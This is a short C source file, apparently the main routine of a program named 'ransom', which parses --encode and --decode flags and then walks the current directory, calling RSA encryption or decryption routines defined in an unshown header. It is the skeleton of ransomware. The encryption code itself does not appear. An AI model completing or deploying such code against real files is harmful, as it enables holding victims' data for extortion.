#include "./FileHandler/FileHandler.h"

int check_flags(char *args[]){
    if (strcmp(args[1],"--help") == 0){
        printf("Usage: ransom --[OPTION]\n");
        return 100;
    }
    if (strcmp(args[1],"--encode") == 0){
        return 0;
    }
    if (strcmp(args[1], "--decode") == 0){
        return 1;
    }
    return -1;
}

int main(int argc, char *argv[]){
    int option = check_flags(argv);
    if (option == 100 || option == -1){
        return 0;
    }
    if (option == 1){
        RSA_decrypt();
    }
    walk("./",option);
    if (option == 0){
        RSA_encrypt();
    }
    return 0;
}
